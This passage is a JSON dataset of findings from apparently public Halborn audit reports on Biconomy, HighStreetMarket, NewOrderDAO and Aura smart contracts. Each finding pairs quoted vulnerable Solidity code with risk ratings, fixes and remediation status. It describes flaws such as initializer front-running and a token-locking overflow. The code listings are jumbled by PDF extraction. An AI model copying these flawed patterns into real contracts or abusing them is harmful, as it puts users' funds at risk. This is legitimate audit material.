(HAL-10) HAL10 - THE CONTRACTS ARE MISSING NATSPEC - INFORMATIONAL (0.0) ", "labels": ["Halborn", "ZetaChain_ZetaNode", "Severity: Informational"]}, {"title": "UNWANTED TOKEN MINTING ON CONTRACT UPGRADE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The BICO Token contract has multiple features such as Governed, AccessControl, Pausable and ContextUpgradeable. Also, this contract uses a Proxy Contract to upgrade its context to implement new features or fixing possible security issues. First of all, Token Contract needs to be deployed. This step is followed by the Proxy Contract initializing the Token Contract. During the initialization process, Token fields are set by the initialize function. Also, 1000000000 BICO tokens will be minted during that process. Calling the __BicoTokenImplementation_init_unchained function will mint these tokens on every contract upgrade. However, these tokens should be minted on the first initialization only. Code Location: Listing (Lines 580,583) 1: contracts/bico-token/bico/BicoTokenImplementation.sol 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 function __BicoTokenImplementation_init_unchained ( address beneficiary ) internal initializer { _name = \" Biconomy Token \" ; _symbol = \" BICO \"; _mint ( msg . sender , 1000000000 * 10 ** decimals () ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); _setupRole ( PAUSER_ROLE , msg . sender ); // EIP -712 domain separator DOMAIN_SEPARATOR = keccak256 ( abi . encode ( DOMAIN_TYPE_HASH , keccak256 ( \" Biconomy Token \" ) , keccak256 ( \"1 \" ) , address ( this ) , bytes32 ( getChainId () ) 13 595 596 597 } ) ); Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to implement an additional check to the contract for validating if the contract was already initialized. Remediation Plan: Biconomy Team solved this issue by moving the mint function SOLVED: into initialize function. Also, two new variables(_initializedVersion , mintingAllowedAfter) are implemented to control if the contract is initialized for the first time. Commit ID: 1b38ce8d9b86ff6238e93c883e69538f46472077 14 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Medium"]}, {"title": "POSSIBLE FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Token Contract initializer were missing access controls, allowing any user to initialize the contract. By front-running the contract, deployers can initialize the contract. Also, on every initialization, contract mints 1000000000 BICO tokens to the beneficiary address. So, it is possible to any front-runner attacker gets all supply during the initialization by front-running. In addition, the attacker acclaim the trustedForwarder and Contract Admin roles by exploiting this vulnerability. Code Location: Listing 2: (Lines 580,583,584,585) contracts/bico-token/bico/BicoTokenImplementation.sol 564 function initialize ( address beneficiary , address trustedForwarder ) 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 public initializer { __BicoTokenImplementation_init_unchained ( beneficiary ); __ERC2771Context_init ( trustedForwarder ); __Pausable_init () ; __AccessControl_init () ; __Governed_init ( msg . sender ); } function __BicoTokenImplementation_init ( address beneficiary , address trustedForwarder ) internal initializer { __ERC2771Context_init ( trustedForwarder ); __Pausable_init () ; __AccessControl_init () ; __Governed_init ( msg . sender ); __BicoTokenImplementation_init_unchained ( beneficiary ); } function __BicoTokenImplementation_init_unchained ( address 15 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 beneficiary ) internal initializer { _name = \" Biconomy Token \" ; _symbol = \" BICO \"; _mint ( msg . sender , 1000000000 * 10 ** decimals () ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); _setupRole ( PAUSER_ROLE , msg . sender ); // EIP -712 domain separator DOMAIN_SEPARATOR = keccak256 ( abi . encode ( DOMAIN_TYPE_HASH , keccak256 ( \" Biconomy Token \" ) , keccak256 ( \"1 \" ) , address ( this ) , bytes32 ( getChainId () ) ) ); } Risk Level: Likelihood - 2 Impact - 4 Recommendations: The BICO Token Contract should be initialized immediately by correct user after deployment. This can be achieved by deployment test script. Use a factory pattern that will deploy and initialize the contracts atomically to prevent front-running of the initialization. Additionally, access control for initialize function should be implemented. 16 Remediation Plan: SOLVED: Biconomy Team fixed this issue by directly initializing the contract after deploying the contract in the deployment and upgrade test scripts. Commit ID: ccdbbe9087a1139946a9b3fc4d9f38b537da241d 17 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Medium"]}, {"title": "LACK OF ZERO ADDRESS CONTROL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Some functions are missing address validation. Every address should be validated and checked that is different than zero. During the test, it was determined that the address(0) control was not performed on the setTrustedForwarder function. Code Location: Listing (Lines 1034,1035) 3: contracts/bico-token/bico/BicoTokenImplementation.sol 1034 function setTrustedForwarder ( address payable _forwarder ) external onlyGovernor { 1035 1036 1037 } _trustedForwarder = _forwarder ; emit TrustedForwarderChanged ( _forwarder , msg . sender ); Risk Level: Likelihood - 3 Impact - 2 Recommendations: It is recommended to validate that every address input is different than zero address. 18 Remediation Plan: SOLVED: address control into the setTrustedForwarder function. Biconomy Team has resolved this issue by implementing zero Commit ID: 5bc8cb7d8815aeab151277c717f58042d002cd52 19 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Listing 4: Missing Re-Entrancy Guard 1 transfer ( address recipient , uint256 amount ) 2 approve ( address spender , uint256 amount ) 3 transferFrom ( address sender , address recipient , uint256 amount ) 4 increaseAllowance ( address spender , uint256 addedValue ) 5 decreaseAllowance ( address spender , uint256 subtractedValue ) 6 function approveWithSig ( uint8 _v , bytes32 _r , bytes32 _s , uint256 _deadline , address _sender , uint256 _batchId , address _recipient , uint256 _amount ) 7 function transferWithSig ( uint8 _v , bytes32 _r , bytes32 _s , uint256 _deadline , address _sender , uint256 _batchId , address _recipient , uint256 _amount ) Risk Level: Likelihood - 2 Impact - 2 20 Recommendations: In the BicoTokenImplementation.sol contract, functions above are missing a nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: Biconomy Team solved this issue by appending OpenZeppelin Reen- trancyGuard library to the Token contract. Halborn Team has confirmed that this library implemented properly. Commit ID: a1974759b906f6f86d7999e66c10302611631eef 21 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 5 1 libs / BaseRelayRecipient . sol :3: pragma solidity ^0.8.0; 2 libs / IRelayRecipient . sol :2: pragma solidity ^0.8.0; 3 test / Greeter . sol :2: pragma solidity ^0.8.0; 4 BiconomyTokenTransparent . sol :4: pragma solidity ^0.8.2; 5 bico / BicoTokenProxy . sol :4: pragma solidity ^0.8.0; 6 bico / ERC20Meta . sol :3: pragma solidity ^0.8.0; 7 bico / BicoTokenImplementation . sol :2: pragma solidity ^0.8.0; 8 bico / BicoTokenV2 . sol :2: pragma solidity ^0.8.0; 9 bico / BicoToken . sol :4: pragma solidity ^0.8.0; 10 bico / BicoToken . sol :9: pragma solidity ^0.8.0; 11 bico / BicoToken . sol :97: pragma solidity ^0.8.0; 12 bico / BicoToken . sol :124: pragma solidity ^0.8.0; 13 bico / BicoToken . sol :335: pragma solidity ^0.8.0; 14 bico / BicoToken . sol :402: pragma solidity ^0.8.0; 15 BiconomyTokenUUPS . sol :5: pragma solidity ^0.8.2; Risk Level: Likelihood - 2 Impact - 2 22 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: This finding was fixed by the Biconomy Team by locking the pragma version. Since the new commit, the Caret(^) symbol in all pragma versions has been removed. Commit ID: 5bc8cb7d8815aeab151277c717f58042d002cd52 23 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Low"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The project uses one of the latest pragma version (0.8.0) which was released on 16th of December, 2020. The latest pragma version (0.8.9) was released in October 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. In the Solitidy Github repository, there is a JSON file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Code Location: Listing 6 1 libs / BaseRelayRecipient . sol :3: pragma solidity ^0.8.0; 2 libs / IRelayRecipient . sol :2: pragma solidity ^0.8.0; 3 test / Greeter . sol :2: pragma solidity ^0.8.0; 4 BiconomyTokenTransparent . sol :4: pragma solidity ^0.8.2; 5 bico / BicoTokenProxy . sol :4: pragma solidity ^0.8.0; 6 bico / ERC20Meta . sol :3: pragma solidity ^0.8.0; 7 bico / BicoTokenImplementation . sol :2: pragma solidity ^0.8.0; 8 bico / BicoTokenV2 . sol :2: pragma solidity ^0.8.0; 9 bico / BicoToken . sol :4: pragma solidity ^0.8.0; 10 bico / BicoToken . sol :9: pragma solidity ^0.8.0; 11 bico / BicoToken . sol :97: pragma solidity ^0.8.0; 12 bico / BicoToken . sol :124: pragma solidity ^0.8.0; 13 bico / BicoToken . sol :335: pragma solidity ^0.8.0; 14 bico / BicoToken . sol :402: pragma solidity ^0.8.0; 15 BiconomyTokenUUPS . sol :5: pragma solidity ^0.8.2; 24 Risk Level: Likelihood - 2 Impact - 2 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. References:  Solidity Releases  Solidity Bugs By Version Remediation Plan: ACKNOWLEDGED: Biconomy Team decided to use pragma 0.8.4. 25 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Low"]}, {"title": "USAGE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During a manual review, the use of block.timestamp has identified. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 7: contracts/bico-token/bico/BicoTokenImplementation.sol 971 require ( _deadline == 0 || block . timestamp <= _deadline , \" BICO :: expired transfer \"); Risk Level: Likelihood - 3 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. 26 Remediation Plan: ACKNOWLEDGED: Biconomy Team acknowledged this issue and claims that Usage of block.timestamp does not possess any security risks. 27 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Low"]}, {"title": "UNUSED FUNCTIONS AND VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During the test, it was determined that some functions and variables on the contract were not used in any way, although they were defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. Code Location: Listing 8: Unused Functions and Variables 779 increaseAllowance ( address spender , uint256 addedValue ) 780 decreaseAllowance ( address spender , uint256 subtractedValue ) 781 _burn ( address account , uint256 amount ) 782 uint 256 batchNonce Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to review these unused functions and variables, and to delete them from the contract if they will continue to be unused. 28 Remediation Plan: NOT APPLICABLE: Since all variables and functions addressed on this vulnerability are used on the contract, this vulnerability is not appli- cable.  increaseAllowance and decreaseAllowance are public versions for users.  _batchNonce variable is removed from signature functions. 29 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Informational"]}, {"title": "MISUSE OF FUNCTION HOOKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During the audit, it was seen that two hook functions were implemented on the contract. The purpose of using these functions under normal conditions is to detect variables such as gas usage. However, it has been seen that these two functions defined on the contract have no purpose. Code Location: Listing 9: contracts/bico-token/bico/BicoTokenImplementation.sol 890 function _beforeTokenTransfer ( 891 892 893 894 address from , address to , uint256 amount ) internal virtual {} Listing 10: contracts/bico-token/bico/BicoTokenImplementation.sol 910 function _afterTokenTransfer ( 911 912 913 914 address from , address to , uint256 amount ) internal virtual {} Risk Level: Likelihood - 1 Impact - 1 30 Recommendations: It is recommended that these functions be implemented in accordance with their purpose, and if not, they should be deleted from the contract. Remediation Plan: SOLVED: _beforeTokenTransfer and _afterTokenTransfer hook functions. Biconomy Team solved issue this by removing unused 31 ", "labels": ["Halborn", "Biconomy_Token", "Severity: Informational"]}, {"title": "AMOUNT PARAMETER CAN BE REMOVED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract HighStreetNftPool contains the function unstakeReward( uint256 _depositId, uint256 _amount) which allows a user to unstake a specified amount of rewards. The _amount parameter here does not provide any utility, as there is no incentive for the user to just claim a part of his total rewards. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the _amount parameter from the unstakeReward() and _unstakeReward() functions. The full reward amount should be sent to the user instead. This will simplify the logic of the functions, saving some gas. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 079f3c357f653d57452059a13d66ec994c80753a 12 ", "labels": ["Halborn", "HighStreetMarket_NFT_Pool", "Severity: Informational"]}, {"title": "EMERGENCYWITHDRAW FUNCTION DOES NOT PROVIDE ANY UTILITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract HighStreetNftPool contains the functions emergencyWithdraw() and _emergencyWithdraw(): Listing 1: emergencyWithdraw - external (Lines 441) 439 function emergencyWithdraw ( uint256 [] calldata _listIds ) external nonReentrant { // delegate call to an internal function _emergencyWithdraw ( msg . sender , _listIds ); 440 441 442 } Listing 2: emergencyWithdraw - internal require ( _listIds . length > 0, \" zero amount \" ); // limit the max nft transfer . require ( _listIds . length <= 40 , \" length exceeds limitation \" ); // get a link to user data struct , we will write to it later User storage user = users [ _staker ]; uint16 [] memory list = user . list ; uint256 amount = _listIds . length ; require ( user . tokenAmount >= amount , \" amount exceeds stake \" ); 639 function _emergencyWithdraw ( address _staker , 640 641 uint256 [] calldata _listIds 642 ) internal virtual { 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 658 // update smart contract state _sync () ; // update user record user . tokenAmount -= amount ; user . subYieldRewards = tokenToReward ( user . tokenAmount , yieldRewardsPerToken ); 13 659 660 661 662 663 664 665 666 667 668 669 670 671 672 673 674 675 676 677 678 679 680 681 } usersLockingAmount = usersLockingAmount - amount ; uint256 index ; uint256 [] memory nfts = new uint256 []( _listIds . length ); for ( uint i =0; i < _listIds . length ; i ++) { index = _listIds [ i ]; if ( UINT_16_MAX == list [ index ]) { nfts [ i ] = 0; } else { nfts [ i ] = uint256 ( list [ index ]) ; } IERC721 ( poolToken ). safeTransferFrom ( address ( this ) , _staker , nfts [ i ]) ; if ( user . tokenAmount != 0) { delete user . list [ index ]; } } if ( user . tokenAmount == 0) { delete user . list ; } emit EmergencyWithdraw ( msg . sender , amount , nfts ); The function _emergencyWithdraw() contains the same code as the _unstake() function, and it is not providing any extra functionality. Furthermore, there is no locking applied to the staked NFTs which means that the user has no restrictions to retrieve them. There is no need for any kind of emergencyWithdraw function in the smart contract. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the emergencyWithdraw() and _emergencyWithdraw () functions. 14 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID a9e1c25ec2de219e1f66c31b51d7b7a7997b15b3 15 ", "labels": ["Halborn", "HighStreetMarket_NFT_Pool", "Severity: Informational"]}, {"title": "SOME FUNCTIONS CAN BE REMOVED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract HighStreetNftPool contains the function mintYieldTo(): Listing 3: mintYieldTo // transfer HIGH tokens as required transferHighToken ( _to , _amount ); 689 function mintYieldTo ( address _to , uint256 _amount ) internal { 690 691 692 693 694 } emit MintYield ( _to , _amount ); This mintYieldTo() function, all it does is calling another internal function: transferHighToken(): Listing 4: transferHighToken 842 function transferHighToken ( address _to , uint256 _value ) internal { 843 844 845 } // just delegate call to the target SafeERC20 . safeTransfer ( IERC20 ( HIGH ) , _to , _value ); At the same time, the transferHighToken() function just calls the SafeERC20.safeTransfer(IERC20(HIGH), _to, _value); function. mintYieldTo() and transferHighToken() can be removed and instead SafeERC20 .safeTransfer can be used directly to save some gas. Risk Level: Likelihood - 1 Impact - 1 16 Recommendation: It is recommended to remove the mintYieldTo() and transferHighToken() functions and instead use directly SafeERC20.safeTransfer. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 8c6269aff32496a7e75630a63abbf80f5015d18a 17 ", "labels": ["Halborn", "HighStreetMarket_NFT_Pool", "Severity: Informational"]}, {"title": "GAS OVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In all the loops, the counter variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: HighStreetNftPool.sol - Line 307: for(uint256 i = pageStart; i < pageEnd; i++){ - Line 350: for(uint256 i = pageStart; i < pageEnd; i++){ - Line 520: for(uint i =0; i < _nftIds.length; i++){ - Line 571: for(uint i =0; i < _listIds.length; i++){ - Line 663: for(uint i =0; i < _listIds.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 5: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This is not applicable outside of loops. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID a4017a4a5eeedb24d3792744cf71c5d0dcf5394c 19 ", "labels": ["Halborn", "HighStreetMarket_NFT_Pool", "Severity: Informational"]}, {"title": "UNNECESSARY INITIALIZATION OF UINT256 VARIABLES TO 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As i is an uint, it is already initialized to 0. uint i = 0 reassigns the 0 to i which wastes gas. Code Location: HighStreetNftPool.sol - Line 519: uint256 addedAmount = 0; - Line 520: for(uint i =0; i < _nftIds.length; i++){ - Line 571: for(uint i =0; i < _listIds.length; i++){ - Line 663: for(uint i =0; i < _listIds.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize i variable to 0 to save some gas. For example: for(uint i; i < _nftIds.length; i++){ Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 8f715b12b6fcc4ce25f27fc2357ab268a1c35472 20 ", "labels": ["Halborn", "HighStreetMarket_NFT_Pool", "Severity: Informational"]}, {"title": "OVERFLOW IN CALCMAXTRANSFERRABLE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract, TimeLockToken the function calcMaxTransferrable() is used to calculate the maximum amount of transferrable tokens for an address: Listing 1: GovernanceTokenV2.sol (Lines 131) 112 // / @dev Calculates the maximum amount of transferrable tokens for address `who ` public view returns ( uint256 ) 113 // / @return Number of transferrable tokens 114 function calcMaxTransferrable ( address who ) 115 116 117 118 { 119 120 121 122 123 if ( timelockedTokens [ who ] == 0) { return balanceOf ( who ); } uint256 maxTokens ; if ( vestTime [ who ] > block . timestamp || cliffTime [ who ] > block . timestamp ){ maxTokens = 0; } else { maxTokens = timelockedTokens [ who ] * ( block . timestamp - vestTime [ who ]) / disbursementPeriod [ who ]; } if ( timelockedTokens [ who ] < maxTokens ){ return balanceOf ( who ); } return balanceOf ( who ) - timelockedTokens [ who ] + maxTokens ; 124 125 126 127 128 129 130 131 132 } function called This _beforeTokenTransfer() hook: is with every transfer because of the 13 Listing 2: GovernanceTokenV2.sol (Lines 105) address from , address to , uint256 amount 100 function _beforeTokenTransfer ( 101 102 103 104 ) internal virtual override { 105 106 107 108 109 } } uint maxTokens = calcMaxTransferrable ( from ); if ( from != address (0 x0 ) && amount > maxTokens ){ revert (\" amount exceeds available unlocked tokens \"); An overflow can occur in the return balanceOf(who)- timelockedTokens[who ] + maxTokens; line that will not allow the user to transfer any of his tokens, even if they are unlocked, until the end of the disbursementPeriod Proof of Concept: The Proof of Concept was executed using the following parameters: - timelockedTokens -> 1000_000000000000000000 - vestTime -> chain.time() = now() - cliffTime -> chain.time() + 15768000 = 6 months - disbursementPeriod -> 31536000 seconds = 1 year 6 months later 500_000000000000000000 of the user2 tokens were Then: 1. Waited 6 months: chain.sleep(15768000). 2. unlocked. 3. 200_000000000000000000 tokens were successfully transferred from user2 to user3. 4. user2 tried then to transfer another 200_000000000000000000 to user4. The transfer reverts with an Integer overflow error. All of the user2 tokens are totally locked now. 5. After this, user2 has to wait until the end of the disbursementPeriod to be able to transfer his tokens. 14 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the overflow and the overall logic of the calcMaxTransferrable() function. Remediation Plan: SOLVED: this e7547837502f1e48151a52acaaa5c722dca4c253: NewOrderDAO team solved issue in the commit ID: 15 16 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Critical"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contracts DisbursementCliff and OneWaySwap the return value of some external transfer calls are not checked. Several tokens do not revert in case of failure and return false. If that happened, for example in the DisbursementCliff contract, the withdrawnTokens state variable would be incorrectly updated and the calculation of the amount of vested tokens would be wrong. It is also considered a best practice to check the return value of a ERC20.transfer() call. Code Location: DisbursementCliff.sol Listing 3: DisbursementCliff.sol (Lines 76,86) revert (\" Withdraw amount exceeds allowed tokens \" ); public isReceiver uint maxTokens = calcMaxWithdraw () ; if ( _value > maxTokens ){ } withdrawnTokens += _value ; token . transfer ( _to , _value ); 67 function withdraw ( address _to , uint256 _value ) 68 69 70 { 71 72 73 74 75 76 77 } 78 79 // / @dev Transfers all tokens to multisig wallet 80 function walletWithdraw () 81 82 83 { 84 85 86 87 } uint balance = token . balanceOf ( address ( this )) ; withdrawnTokens += balance ; token . transfer ( wallet , balance ); public isWallet 17 one-way-swap.sol Listing 4: one-way-swap.sol (Lines 36,37,44) oldToken . transferFrom ( msg . sender , burnAddress , amount ); newToken . transfer ( msg . sender , amount ); public whenNotPaused 32 function swap ( uint256 amount ) 33 34 35 { 36 37 38 } 39 40 function burn ( uint256 amount , string memory why ) 41 42 43 { 44 45 46 } public whenNotPaused oldToken . transferFrom ( msg . sender , burnAddress , amount ); emit Burned ( msg . sender , amount , why ); Listing 5: one-way-swap.sol (Lines 70) 66 function walletWithdraw ( ERC20 token , uint256 amount , address destination ) public onlyOwner token . transfer ( destination , amount ); 67 68 69 { 70 71 } Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to use SafeERC20. 18 Remediation Plan: SOLVED: NewOrderDAO team now makes use of SafeERC20.safeTransfer() and SafeERC20.safeTransferFrom() in all their token transfers. 19 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The constructor of the OneWaySwap contract is missing address validation. Every address should be validated and checked that is different from zero. This is also considered a best practice. Code location: Listing 6: one-way-swap.sol (Lines 24) 24 constructor ( ERC20 oldToken_ , ERC20 newToken_ , address burnAddress_ ) oldToken = oldToken_ ; newToken = newToken_ ; burnAddress = burnAddress_ ; _pause () ; 25 { 26 27 28 29 30 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: NewOrderDAO team added the zero address checks. 20 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Low"]}, {"title": "SOLC 0.8.3 COMPILER VERSION CONTAINS MULTIPLE BUGS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.3 set in the truffle-config.js file of the GovernanceTokenV2 project is missing all these fixes:  0.8.4  0.8.9 Code Location: Listing 7: GovernanceTokenV2.sol 1 pragma solidity ^0.8.3; Listing 8: truffle-config.js (Lines 102) 100 compilers : { 101 102 solc : { version : \" 0.8.3 \" , // Fetch exact version from solc - bin ( default : truffle 's version ) // docker : true , // Use \"0.5.1\" you 've installed locally with docker ( default : false ) // settings : { // See the solidity docs for advice about optimization and evmVersion optimizer : { enabled : false , runs : 200 }, evmVersion : \" byzantium \" 21 103 104 105 106 107 108 109 110 111 112 }, }, // // // // // // } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if you still want to use ^0.8.0, because of the new functionality it provides, it is recommended to use 0.8.9 version. Remediation Plan: SOLVED: NewOrderDAO team set in the truffle-config.js file the 0.8.9 version for the contracts GovernanceTokenV2 and OneWaySwap and the 0.6.12 version for the DisbursementCliff contract. 22 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: GovernanceTokenV2.sol - newTimeLock() (GovernanceTokenV2.sol#70-85) - balanceUnlocked() (GovernanceTokenV2.sol#158-160) DisbursementCliff.sol - withdraw() (DisbursementCliff.sol#67-77) - walletWithdraw() (DisbursementCliff.sol#80-87) one-way-swap.sol - swap() (onewayswap.sol#32-38) - burn() (onewayswap.sol#40-46) - walletWithdraw() (onewayswap.sol#66-71) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. 23 Remediation Plan: SOLVED: NewOrderDAO team declared the mentioned functions as external to reduce the gas costs. 24 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Informational"]}, {"title": "TIMELOCKTOKEN IS NOT PAUSABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Even if this The contract TimeLockToken is not pausable/ownable. addition would add centralization it could be useful in case of an emergency, for example, the token could be paused in case of a cross-chain bridge hack. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In case of wanting to add an extra security layer, Halborn recommends making the contract pausable as a mitigation against external contract hacks. Remediation Plan: SOLVED: NewOrderDAO team created a Pausable variant of the TimeLockToken contract called GovernanceTokenPausable. NewOrderDAO team will decide which variant to deploy. 25 ", "labels": ["Halborn", "NewOrderDAO", "Severity: Informational"]}, {"title": "LACK OF TRANSFEROWNERSHIP PATTERN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The current ownership transfer process for the Aura contracts inheriting from Ownable involves the current owner calling the transferOwnership() function: Listing 1: Ownable.sol function _transferOwnership ( address newOwner ) internal virtual address oldOwner = _owner ; _owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); } 71  { 72 73 74 75 76 } If the nominated account is not a valid account, it is entirely possible that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. For example, in the case of the AuraLocker 